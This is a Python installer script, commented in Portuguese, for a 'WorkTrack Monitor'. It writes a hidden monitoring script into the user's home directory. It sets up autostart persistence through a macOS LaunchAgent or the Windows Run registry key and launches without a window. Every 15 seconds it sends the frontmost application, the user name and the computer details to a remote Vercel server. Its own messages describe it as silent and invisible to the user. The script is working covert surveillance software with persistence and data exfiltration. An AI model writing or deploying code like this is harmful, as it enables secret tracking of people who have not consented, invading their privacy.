#!/usr/bin/env python3
"""
Instalador Executável - WorkTrack Monitor
Instala o monitor para funcionar invisível em background
"""

import os
import sys
import platform
import subprocess
import shutil
from pathlib import Path

def install_monitor():
    """Instalar o monitor silencioso"""
    print("🔧 Instalando WorkTrack Monitor Silencioso...")
    
    # Configurações
    home_dir = Path.home()
    install_dir = home_dir / ".worktrack_monitor"
    server_url = os.environ.get('WORKTRACK_SERVER_URL') or "https://simple-monitor-online-qjxx1b0hc-marcos10895s-projects.vercel.app"
    
    try:
        # 1. Criar diretório
        install_dir.mkdir(exist_ok=True, parents=True)
        print("📁 Diretório criado")
        
        # 2. Criar script do monitor
        monitor_script = install_dir / "monitor.py"
        
        with open(monitor_script, 'w', encoding='utf-8') as f:
            f.write(f'''#!/usr/bin/env python3
import json
import time
import os
import sys
import subprocess
import requests
from datetime import datetime
import platform

class SilentMonitor:
    def __init__(self):
        self.server_url = "{server_url}"
        self.computer_id = self.get_computer_id()
        self.computer_name = platform.node()
        self.user_name = os.environ.get('USER', 'user')
        self.os_info = f"{{platform.system()}} {{platform.release()}}"
        self.total_minutes = 0
        self.start_time = time.time()
        self.log_file = os.path.join("{install_dir}", "monitor.log")

    def log(self, msg):
        try:
            with open(self.log_file, 'a') as f:
                f.write(f"[{{datetime.now()}}] {{msg}}\\n")
        except:
            pass

    def get_computer_id(self):
        return f"{{platform.node()}}-{{os.environ.get('USER', 'user')}}".lower()

    def get_current_app(self):
        try:
            if platform.system() == "Darwin":
                # macOS
                cmd = ['osascript', '-e', 'tell application "System Events" to get name of first application process whose frontmost is true']
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    return result.stdout.strip()
            elif platform.system() == "Windows":
                # Windows - versão básica
                return "Windows App"
            return "Sistema Ativo"
        except:
            return "Aplicação Desconhecida"

    def register(self):
        try:
            data = {{
                'type': 'register',
                'computer_id': self.computer_id,
                'computer_name': self.computer_name,
                'user_name': self.user_name,
                'os_info': self.os_info
            }}
            requests.post(f'{{self.server_url}}/api/data', json=data, timeout=5)
            self.log("Registrado")
            return True
        except Exception as e:
            self.log(f"Erro registro: {{e}}")
            return False

    def send_activity(self, activity):
        try:
            data = {{
                'type': 'activity',
                'computer_id': self.computer_id,
                'computer_name': self.computer_name,
                'user_name': self.user_name,
                'os_info': self.os_info,
                'activity': activity,
                'window': activity,
                'total_minutes': self.total_minutes,
                'timestamp': datetime.now().isoformat()
            }}
            requests.post(f'{{self.server_url}}/api/data', json=data, timeout=5)
            return True
        except:
            return False

    def run(self):
        self.log("Monitor iniciado")
        self.register()
        
        last_app = None
        
        while True:
            try:
                # Atualizar tempo total
                self.total_minutes = int((time.time() - self.start_time) / 60)
                
                # Obter app atual
                current_app = self.get_current_app()
                
                # Enviar atividade se mudou
                if current_app != last_app:
                    activity = f"Usando {{current_app}}"
                    if self.send_activity(activity):
                        self.log(f"Enviado: {{activity}}")
                    last_app = current_app
                
                time.sleep(15)  # Verificar a cada 15 segundos
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                self.log(f"Erro: {{e}}")
                time.sleep(30)

if __name__ == "__main__":
    monitor = SilentMonitor()
    monitor.run()
''')
        
        print("📝 Script do monitor criado")
        
        # 3. Instalar requests se necessário
        try:
            subprocess.run([sys.executable, '-m', 'pip', 'install', 'requests'], 
                          capture_output=True, check=True)
            print("📦 Dependências instaladas")
        except:
            print("⚠️ Aviso: Erro ao instalar requests")
        
        # 4. Configurar autostart baseado no sistema
        system = platform.system()
        
        if system == "Darwin":  # macOS
            # Criar LaunchAgent
            launch_dir = home_dir / "Library" / "LaunchAgents"
            launch_dir.mkdir(exist_ok=True)
            
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.worktrack.monitor</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{monitor_script}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>{install_dir}/output.log</string>
    <key>StandardErrorPath</key>
    <string>{install_dir}/error.log</string>
</dict>
</plist>'''
            
            plist_file = launch_dir / "com.worktrack.monitor.plist"
            with open(plist_file, 'w') as f:
                f.write(plist_content)
            
            # Carregar e iniciar
            subprocess.run(['launchctl', 'load', str(plist_file)], capture_output=True)
            subprocess.run(['launchctl', 'start', 'com.worktrack.monitor'], capture_output=True)
            
            print("🚀 Autostart configurado (macOS)")
            
        elif system == "Windows":
            # Adicionar ao registro do Windows
            try:
                import winreg
                key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                command = f'"{sys.executable}" "{monitor_script}"'
                winreg.SetValueEx(key, "WorkTrackMonitor", 0, winreg.REG_SZ, command)
                winreg.CloseKey(key)
                print("🚀 Autostart configurado (Windows)")
                
                # Iniciar imediatamente em background
                subprocess.Popen([sys.executable, str(monitor_script)], 
                               creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
                
            except Exception as e:
                print(f"⚠️ Erro autostart Windows: {e}")
        
        else:  # Linux
            print("🐧 Para Linux, adicione manualmente ao crontab:")
            print(f"@reboot {sys.executable} {monitor_script}")
        
        print("\\n✅ Instalação concluída!")
        print("📊 Monitor rodando em background")
        print("🔒 Invisível ao usuário")
        print(f"📁 Logs em: {install_dir}")
        
        # Mostrar como desinstalar
        if system == "Darwin":
            print("\\n💡 Para desinstalar:")
            print("launchctl unload ~/Library/LaunchAgents/com.worktrack.monitor.plist")
            print("rm ~/Library/LaunchAgents/com.worktrack.monitor.plist")
            print(f"rm -rf {install_dir}")
        elif system == "Windows":
            print("\\n💡 Para desinstalar:")
            print("- Remova 'WorkTrackMonitor' do registro em:")
            print("  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
            print(f"- Delete a pasta: {install_dir}")
        
        return True
        
    except Exception as e:
        print(f"❌ Erro na instalação: {e}")
        return False

if __name__ == "__main__":
    print("🔧 WorkTrack Monitor - Instalador Silencioso")
    print("=" * 50)
    
    if install_monitor():
        print("\\n🎉 Pronto! O monitor está funcionando silenciosamente.")
    else:
        print("\\n❌ Falha na instalação!")
        sys.exit(1)
